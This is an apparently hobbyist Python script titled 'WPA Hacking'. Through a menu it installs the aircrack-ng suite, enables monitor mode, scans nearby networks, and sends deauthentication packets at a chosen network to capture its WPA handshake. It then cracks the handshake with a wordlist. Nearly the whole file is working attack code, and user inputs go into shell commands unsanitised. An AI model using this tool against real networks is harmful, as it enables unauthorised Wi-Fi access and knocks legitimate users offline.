import os
import subprocess
from subprocess import check_call

print("\nInstalling Needed Tools")
print("\n")
cmd0 = os.system("apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite")
cmd  = os.system("sleep 3 && clear")
def intro():
    cmd  = os.system("clear")
    print("""\033[1;32m
---------------------------------------------------------------------------------------
WPA Hacking


                                                            Coded By Zoubir And Abbas 
---------------------------------------------------------------------------------------                                                                     
(1)Start monitor mode       
(2)Stop monitor mode                        
(3)Scan Networks                            
(4)Getting Handshake(monitor mode needed)   
(6)Crack Handshake with wordlist    (Handshake needed)            

(0)About Us
(00)Exit
-----------------------------------------------------------------------
""")
    print("\nEnter your choise here : !# ")
    var = int(input(""))
    if var == 1 :
        print("\nEnter the interface:(Default(wlan0/wlan1))")
        interface = input("")
        order = "airmon-ng start {} && airmon-ng check kill".format(interface)
        geny  = os.system(order)
        intro()
    elif var == 2 :
        print("\nEnter the interface:(Default(wlan0mon/wlan1mon))")
        interface = input("")
        order = "airmon-ng stop {} && service network-manager restart".format(interface)
        geny  = os.system(order)
        intro()
    elif var == 3 :
        print("\nEnter the interface:(Default >> (wlan0mon/wlan1mon))")
        interface = input("")
        order = "sudo airodump-ng {} -M".format(interface)
        print("When Done Press CTRL+c")
        cmd = os.system("sleep 3")
        geny  = os.system(order)
        cmd = os.system("sleep 10")
        intro()
    elif var == 4 :
        print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")
        interface = input("")
        order     = "sudo airodump-ng {} -M".format(interface)
        print("\nWhen Done Press CTRL+c")
        print("\nNote: Under Probe it might be Passwords So copy them to the worlist file")
        print("\nDon't Attack The Network if its Data is ZERO (you waste your time)")
        print("\nyou Can use 's' to arrange networks")
        cmd       = os.system("sleep 7")
        geny      = os.system(order)
        print("\nEnter the bssid of the target?")
        bssid     = str(input(""))
        print("\nEnter the channel of the network?")
        channel   = int(input())
        print("Enter the path of the output file ?")
        path = str(input(""))
        print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
        print("the number of the packets Depends on the Distance Between you and the network")
        dist = int(input(""))
        order = "sudo airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,path,dist,bssid,interface)
        geny = os.system(order)
        intro()
    
    elif var == 6 :
        print("\nEnter the path of the handshake file ?")
        path = str(input(""))
        print("\nEnter the path of the wordlist ?")
        wordlist = str(input(""))
        order = ("aircrack-ng {} -w {}").format(path,wordlist)
        geny = os.system(order)
        exit()
   
    else:
        print("Not Found")
        cmd = os.system("sleep 2")
        intro()
intro()
